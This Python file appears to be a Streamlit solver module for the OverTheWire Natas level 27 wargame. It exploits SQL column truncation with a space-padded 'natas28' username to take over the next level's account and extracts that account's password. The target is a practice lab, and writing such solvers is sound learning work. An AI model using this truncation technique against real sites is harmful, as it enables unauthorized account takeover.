import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting SQL Truncation Logic with Trim-Bypass Vectors...")
    
    # 1. Align level credentials
    username = "natas27"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    target_url = "http://natas27.natas.labs.overthewire.org/index.php"
    
    # 2. Forge the 65-character creation string to beat the trim() check
    # natas28 (7) + 57 spaces + 'x' (1) = 65 characters.
    # Slicing to 64 leaves 'natas28' followed by 57 spaces.
    spaces_count = 57
    payload_username = "natas28" + (" " * spaces_count) + "x"
    payload_password = "engine_override_2026"
    
    create_data = {
        "username": payload_username,
        "password": payload_password
    }
    
    try:
        # Step 1: Send creation request (This will safely bypass trim() due to trailing 'x')
        st.write("📡 Dispatched trim-immune creation vector...")
        session.post(target_url, data=create_data, timeout=10)
        
        # Step 2: Log in using the username WITH spaces to isolate our credential entry
        st.write("🔄 Authenticating via space-padded identifier alignment...")
        login_data = {
            "username": "natas28" + (" " * spaces_count),
            "password": payload_password
        }
        response = session.post(target_url, data=login_data, timeout=10)
        
        # 3. Extract the 32-character password token
        all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
        new_tokens = [t for t in all_tokens if t != current_password and t != payload_password]
        
        if new_tokens:
            st.success("🎯 SQL Column Truncation executed flawlessly!")
            st.success("🎯 Level 27 challenge resolved successfully!")
            st.code(f"Natas 28 Password: {new_tokens[0]}")
        else:
            st.error("The authentication chain completed but did not return the flag.")
            with st.expander("Examine Response State Canvas"):
                st.code(response.text, language="html")
                
    except Exception as e:
        st.error(f"Execution failed due to programmatic error: {str(e)}")